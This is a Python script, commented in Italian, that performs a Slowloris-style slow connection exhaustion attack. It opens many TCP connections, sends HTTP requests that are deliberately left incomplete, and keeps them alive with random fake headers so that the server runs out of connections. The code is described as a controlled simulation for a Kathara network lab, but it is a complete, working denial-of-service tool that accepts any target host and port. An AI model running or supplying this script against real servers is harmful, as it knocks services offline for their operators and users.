#!/usr/bin/env python3
import socket
import time
import argparse
import threading
import random


def create_slow_socket(target_host, target_port, timeout=4):
    """
    Apre una connessione TCP e invia una richiesta HTTP incompleta.
    La connessione viene lasciata aperta.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    s.connect((target_host, target_port))

    # Richiesta HTTP volutamente incompleta: non viene inviato il doppio CRLF finale
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"User-Agent: kathara-slow-test\r\n"
        f"Accept-language: en-US,en,q=0.5\r\n"
    )

    s.sendall(request.encode())

    return s


def keep_socket_alive(sock, target_host):
    """
    Invia periodicamente piccoli header fittizi per evitare che il server chiuda
    la connessione per inattività.
    """
    header = f"X-Keep-Alive-{random.randint(1, 999999)}: {random.randint(1, 999999)}\r\n"
    sock.sendall(header.encode())


def slow_attack(target_host, target_port, connections, interval, duration):
    sockets = []
    start_time = time.time()

    print(f"[+] Target: {target_host}:{target_port}")
    print(f"[+] Connessioni richieste: {connections}")
    print(f"[+] Intervallo keep-alive: {interval} secondi")
    print(f"[+] Durata: {duration} secondi")
    print("[+] Avvio simulazione slow connection exhaustion")

    # Fase 1: apertura delle connessioni
    for i in range(connections):
        try:
            s = create_slow_socket(target_host, target_port)
            sockets.append(s)
            print(f"[+] Connessione aperta: {i + 1}/{connections}")
        except Exception as e:
            print(f"[-] Connessione fallita {i + 1}/{connections}: {e}")

        # Piccola pausa per evitare burst troppo aggressivi
        time.sleep(0.05)

    print(f"[+] Connessioni effettivamente aperte: {len(sockets)}")

    # Fase 2: mantenimento delle connessioni
    while time.time() - start_time < duration:
        alive_sockets = []

        for s in sockets:
            try:
                keep_socket_alive(s, target_host)
                alive_sockets.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass

        sockets = alive_sockets

        print(f"[*] Connessioni ancora attive: {len(sockets)}")

        # Se troppe connessioni sono cadute, prova a ricrearle
        missing = connections - len(sockets)

        for _ in range(missing):
            try:
                s = create_slow_socket(target_host, target_port)
                sockets.append(s)
            except Exception:
                pass

        time.sleep(interval)

    # Fase 3: chiusura ordinata
    print("[+] Fine simulazione. Chiusura socket.")

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print("[+] Completato.")


def main():
    parser = argparse.ArgumentParser(
        description="Simulazione controllata di slow connection exhaustion per laboratorio Kathara"
    )

    parser.add_argument("target_host", help="IP o hostname del server vittima")
    parser.add_argument("target_port", type=int, help="Porta del servizio HTTP/TCP")
    parser.add_argument("-c", "--connections", type=int, default=100, help="Numero di connessioni simultanee")
    parser.add_argument("-i", "--interval", type=int, default=10, help="Intervallo tra keep-alive, in secondi")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Durata totale dell'attacco, in secondi")

    args = parser.parse_args()

    slow_attack(
        target_host=args.target_host,
        target_port=args.target_port,
        connections=args.connections,
        interval=args.interval,
        duration=args.duration
    )


if __name__ == "__main__":
    main()